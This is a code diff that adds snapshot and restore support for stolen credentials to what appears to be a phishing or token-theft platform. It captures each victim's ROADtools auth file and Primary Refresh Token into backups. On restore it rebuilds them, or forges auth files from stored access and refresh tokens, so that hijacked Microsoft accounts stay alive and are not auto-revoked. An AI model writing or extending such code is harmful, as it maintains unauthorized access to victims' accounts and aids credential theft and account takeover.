@@ -34,6 +34,11 @@ SCOPED_TABLES = ('sessions', 'deployments', 'keyword_rules', 'keyword_matches',
                  'b2b_campaigns', 'templates', 'preland_templates',
                  'deployment_hits', 'keyword_alert_ledger', 'owned_domains')
 
+# Side table inside the snapshot holding on-disk victim artifacts. `roadtx.prt`
+# is a full PRT JSON document that cannot be rebuilt from the DB — without it
+# the token refresher fails and auto-revokes the restored session.
+ARTIFACT_TABLE = '_victim_artifacts'
+
 # Tables with no owner_id of their own, scoped through a parent row.
 #   table -> (parent table, local fk column, parent fk column)
 INDIRECT_TABLES = {
@@ -115,6 +120,25 @@ def create_snapshot(owner_id=None):
                                 tuple(d.values()))
                 except sqlite3.IntegrityError:
                     pass
+
+        # 3. Capture on-disk artifacts for this tenant's sessions.
+        dst.execute(f"CREATE TABLE IF NOT EXISTS {ARTIFACT_TABLE} "
+                    "(user_code TEXT, filename TEXT, content BLOB)")
+        victims_dir = os.path.join(os.path.dirname(os.path.abspath(Config.DB_PATH)), 'victims')
+        for row in _scoped_rows(src, 'sessions', owner_id):
+            uc = row['user_code']
+            vdir = os.path.join(victims_dir, uc)
+            if not os.path.isdir(vdir):
+                continue
+            for fn in ('.roadtools_auth', 'roadtx.prt'):
+                fp = os.path.join(vdir, fn)
+                if os.path.isfile(fp):
+                    try:
+                        with open(fp, 'rb') as fh:
+                            dst.execute(f"INSERT INTO {ARTIFACT_TABLE} VALUES (?,?,?)",
+                                        (uc, fn, fh.read()))
+                    except OSError:
+                        pass
         dst.commit()
     finally:
         src.close()
@@ -351,6 +375,13 @@ def restore_from_file(filepath, owner_id=None):
                     pass
             restored[table] = n
         live.commit()
+
+        # Rebuild each restored victim's artifact directory. Without this the
+        # token refresher finds no roadtx.prt, fails three times and flips the
+        # session to REVOKED within ~90s — the restore looks like it worked and
+        # then the account silently dies.
+        rebuilt = _rebuild_artifacts(src, uc_map)
+        restored['artifacts'] = rebuilt
         return {'success': True, 'restored': restored}
     except Exception as e:
         live.rollback()
@@ -358,3 +389,61 @@ def restore_from_file(filepath, owner_id=None):
     finally:
         src.close()
         live.close()
+
+
+def _rebuild_artifacts(src, uc_map):
+    """Recreate victim folders (auth file + PRT) for restored sessions.
+
+    Returns the number of sessions whose artifacts were rebuilt.
+    """
+    victims_dir = os.path.join(os.path.dirname(os.path.abspath(Config.DB_PATH)), 'victims')
+    rebuilt = 0
+
+    # Prefer artifacts stored in the snapshot — roadtx.prt is a full PRT JSON
+    # document that cannot be derived from the DB row.
+    stored = {}
+    try:
+        for r in src.execute(f"SELECT user_code, filename, content FROM {ARTIFACT_TABLE}"):
+            stored.setdefault(r[0], {})[r[1]] = r[2]
+    except sqlite3.OperationalError:
+        pass
+
+    for old_uc, new_uc in uc_map.items():
+        try:
+            row = src.execute("SELECT * FROM sessions WHERE user_code = ?", (old_uc,)).fetchone()
+            if not row:
+                continue
+            d = dict(row)
+            vdir = os.path.join(victims_dir, new_uc)
+            os.makedirs(vdir, exist_ok=True)
+
+            have = stored.get(old_uc) or {}
+            if have:
+                for fn, content in have.items():
+                    with open(os.path.join(vdir, fn), 'wb') as f:
+                        f.write(content)
+                rebuilt += 1
+                continue
+
+            # No stored artifacts (older snapshot): synthesize what we can.
+            at = d.get('access_token') or ''
+            rt = d.get('refresh_token') or ''
+            auth = {
+                'tokenType': 'Bearer',
+                'expiresOn': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'tenantId': 'common',
+                '_clientId': '29d9ed98-a469-4536-ade2-f981bc1d605e',
+                'accessToken': at,
+                'refreshToken': rt,
+            }
+            with open(os.path.join(vdir, '.roadtools_auth'), 'w', encoding='utf-8') as f:
+                json.dump(auth, f)
+
+            prt = d.get('prt_cookie')
+            if prt:
+                with open(os.path.join(vdir, 'roadtx.prt'), 'w', encoding='utf-8') as f:
+                    f.write(prt if isinstance(prt, str) else json.dumps(prt))
+            rebuilt += 1
+        except Exception as e:
+            logger.warning(f"[RESTORE] artifact rebuild failed for {new_uc}: {e}")
+    return rebuilt
